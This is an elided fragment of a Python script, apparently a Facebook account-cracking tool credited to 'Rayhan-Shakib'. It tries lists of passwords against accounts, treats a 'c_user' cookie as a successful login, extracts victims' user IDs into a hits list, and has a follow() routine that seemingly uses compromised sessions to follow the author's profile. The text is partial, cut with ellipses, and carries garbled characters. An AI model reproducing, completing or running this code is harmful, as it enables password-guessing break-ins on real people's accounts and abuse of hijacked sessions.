...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/Mark.Rayhan.74', {
...
--------------------------------------------
[âœ“] FACEBOOK  >  MARK RAYHAN
[âœ“] GITHUB    >  RAYHAN-SHAKIB
[âœ“] VERSION   > 0.0.3 
--------------------------------------------""")
loop = 0
oks = []
...
try:
    ...
    print(' WELCOME TO RAYHAN-SHAKIB  WORLD ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[RS-CP] '+uid+ ' | ' +ps+'')
